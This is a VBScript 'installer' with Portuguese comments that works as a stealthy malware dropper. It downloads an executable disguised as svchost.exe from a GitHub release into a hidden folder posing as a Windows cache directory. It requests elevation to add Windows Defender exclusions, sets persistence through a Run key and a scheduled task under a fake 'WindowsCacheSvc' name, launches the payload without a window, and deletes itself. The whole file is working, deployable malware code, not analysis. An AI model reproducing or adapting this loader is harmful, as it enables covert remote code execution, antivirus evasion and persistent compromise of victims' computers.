' installer.vbs — Auto-instalador com retry via Registro do Windows.
'
' Fluxo:
'   1. Se svchost.exe JÁ existe na pasta → roda e sai. (não baixa nada)
'   2. Se NÃO existe → tenta baixar do GitHub.
'      2a. Sucesso → adiciona exclusão no Defender (UAC 1x), instala,
'                    registra persistência definitiva, roda.
'      2b. Falha   → registra o INSTALADOR no Run (pra tentar de novo no
'                    próximo logon) e sai silenciosamente.

Option Explicit

Dim shell, fso, userProfile, localAppData, destino, exeUrl, tmpExe
Dim cmdBaixar, destinoExe, tentativas, rc, tamArquivo
Dim vbsPath, driveObj, espacoLivreMB, psKill
Dim tentativasMove

' ==== Persistência ====
Dim regRun, regValorNome, regInstalador, regAgente
Dim taskName, psTask, vbsDir, vbsNome
Dim pastaDefender, psExclusao, cmdElevar, psChecker, jaExcluido

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ==== Configurações ====
exeUrl = "https://github.com/DesconhecidoPorOpcao/0T.romujaPnp/releases/latest/download/svchost.exe"

userProfile  = shell.ExpandEnvironmentStrings("%USERPROFILE%")
localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")

destino    = localAppData & "\Microsoft\Windows\Caches\Local"
destinoExe = destino & "\svchost.exe"
tmpExe     = destino & "\svchost_novo.exe"

' ==== Persistência ====
regRun        = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
regValorNome  = "WindowsCacheSvc"
taskName      = "WindowsCacheSvc"

vbsPath = WScript.ScriptFullName
vbsDir  = fso.GetParentFolderName(vbsPath)
vbsNome = fso.GetFileName(vbsPath)

' Comando do instalador pra colocar no Run (usado só quando o download falha)
regInstalador = "wscript.exe //B """ & vbsPath & """"

' Comando do agente pra colocar no Run (usado quando instala com sucesso)
regAgente = """" & destinoExe & """"

' Pasta que vai ser excluída do Defender
pastaDefender = destino

' =====================================================================
' PASSO 0 — Já está instalado?
' =====================================================================
If fso.FileExists(destinoExe) Then
    On Error Resume Next
    tamArquivo = fso.GetFile(destinoExe).Size
    On Error Goto 0

    If tamArquivo >= 1048576 Then
        ' --- Já instalado. Garante que está rodando e sai. ---

        On Error Resume Next
        shell.RegWrite regRun & "\" & regValorNome, regAgente, "REG_SZ"
        On Error Goto 0

        ' Já está rodando?
        Dim psCheckProc
        psCheckProc = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
                      "$alvo = '" & destinoExe & "'; " & _
                      "$p = Get-CimInstance Win32_Process -Filter ""Name='svchost.exe'"" -ErrorAction SilentlyContinue | " & _
                      "Where-Object { $_.ExecutablePath -ieq $alvo }; " & _
                      "if ($p) { exit 0 } else { exit 1 }"

        On Error Resume Next
        rc = shell.Run(psCheckProc, 0, True)
        On Error Goto 0

        If rc <> 0 Then
            On Error Resume Next
            shell.Run regAgente, 1, False
            On Error Goto 0
        End If

        WScript.Quit 0
    End If
End If

' =====================================================================
' PASSO 1 — Garante pasta + persistência do INSTALADOR
' =====================================================================
If Not fso.FolderExists(destino) Then
    fso.CreateFolder(destino)
End If
shell.Run "attrib +h +s """ & destino & """", 0, True

On Error Resume Next
shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
On Error Goto 0

' =====================================================================
' PASSO 1.5 — Exclusão no Windows Defender (UAC 1x)
' =====================================================================
' Mesma pasta onde o svchost.exe vai morar. Só pergunta se ainda não
' estiver na lista de exclusões. Se o UAC for negado, o script segue
' normalmente (o agente principal tenta de novo depois, ou o próximo
' logon tenta).
' =====================================================================

psChecker = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
            "$p = '" & pastaDefender & "'; " & _
            "$excl = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath; " & _
            "if ($excl -contains $p) { exit 0 } else { exit 1 }" & _
            """"

On Error Resume Next
rc = shell.Run(psChecker, 0, True)
On Error Goto 0

If rc <> 0 Then
    ' Não está excluída ainda → pede UAC e adiciona.
    ' Add-MpPreference exige elevação, então usamos Start-Process -Verb RunAs.
    psExclusao = "$p = '" & pastaDefender & "'; " & _
                 "Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; " & _
                 "Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue"

    ' escapa aspas simples pro PowerShell aceitar dentro do -Command
    psExclusao = Replace(psExclusao, "'", "''")

    cmdElevar = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
                "Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden " & _
                "-ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command','" & psExclusao & "'" & _
                """"

    On Error Resume Next
    shell.Run cmdElevar, 0, True
    On Error Goto 0
End If

' =====================================================================
' PASSO 4 — Mata processo antigo (se houver)
' =====================================================================
psKill = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
         "$alvo = '" & destinoExe & "'; " & _
         "Get-CimInstance Win32_Process -Filter ""Name='svchost.exe'"" -ErrorAction SilentlyContinue | " & _
         "Where-Object { $_.ExecutablePath -ieq $alvo } | " & _
         "ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" & _
         """"
On Error Resume Next
shell.Run psKill, 0, True
On Error Goto 0
WScript.Sleep 2000

' =====================================================================
' PASSO 5 — Baixa svchost.exe do GitHub
' =====================================================================
cmdBaixar = "powershell -NoProfile -WindowStyle Hidden -Command ""try { " & _
            "Invoke-WebRequest -Uri '" & exeUrl & "' -OutFile '" & tmpExe & "' " & _
            "-UseBasicParsing -ErrorAction Stop; exit 0 } catch { exit 1 }"""
rc = shell.Run(cmdBaixar, 0, True)

tentativas = 0
Do While Not fso.FileExists(tmpExe) And tentativas < 120
    WScript.Sleep 500
    tentativas = tentativas + 1
Loop

tamArquivo = 0
If fso.FileExists(tmpExe) Then
    tamArquivo = fso.GetFile(tmpExe).Size
End If

If Not fso.FileExists(tmpExe) Or tamArquivo < 1048576 Then
    On Error Resume Next
    fso.DeleteFile tmpExe, True
    On Error Goto 0

    On Error Resume Next
    shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
    On Error Goto 0

    WScript.Quit 0
End If

' =====================================================================
' PASSO 6 — Move pra destino final (com retry)
' =====================================================================
tentativasMove = 0
Do While tentativasMove < 30
    On Error Resume Next
    If fso.FileExists(destinoExe) Then
        fso.DeleteFile destinoExe, True
    End If
    Err.Clear
    fso.MoveFile tmpExe, destinoExe
    If Err.Number = 0 Then Exit Do
    Err.Clear
    On Error Goto 0
    WScript.Sleep 500
    tentativasMove = tentativasMove + 1
Loop

If tentativasMove >= 30 Then
    On Error Resume Next
    shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
    On Error Goto 0
    WScript.Quit 0
End If

' =====================================================================
' PASSO 7 — SUCESSO. Troca o Run: instalador → agente.
' =====================================================================
On Error Resume Next
shell.RegWrite regRun & "\" & regValorNome, regAgente, "REG_SZ"
If Err.Number <> 0 Then
    Err.Clear
    shell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\" & regValorNome, _
                   regAgente, "REG_SZ"
End If
On Error Goto 0

' (Opcional) Tarefa no Agendador como backup
psTask = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
         "$nome = '" & taskName & "'; " & _
         "$exe  = '" & destinoExe & "'; " & _
         "try { " & _
         "  $a = New-ScheduledTaskAction -Execute $exe; " & _
         "  $t = New-ScheduledTaskTrigger -AtLogOn; " & _
         "  $s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; " & _
         "  Register-ScheduledTask -TaskName $nome -Action $a -Trigger $t -Settings $s -Force -ErrorAction Stop | Out-Null; " & _
         "  exit 0 " & _
         "} catch { exit 1 }"""
On Error Resume Next
shell.Run psTask, 0, True
On Error Goto 0

' =====================================================================
' PASSO 8 — Roda o agente (sem janela)
' =====================================================================
shell.Run regAgente, 0, False

' =====================================================================
' PASSO 9 — Auto-deleta o .vbs
' =====================================================================
shell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & vbsPath & """", 0, False
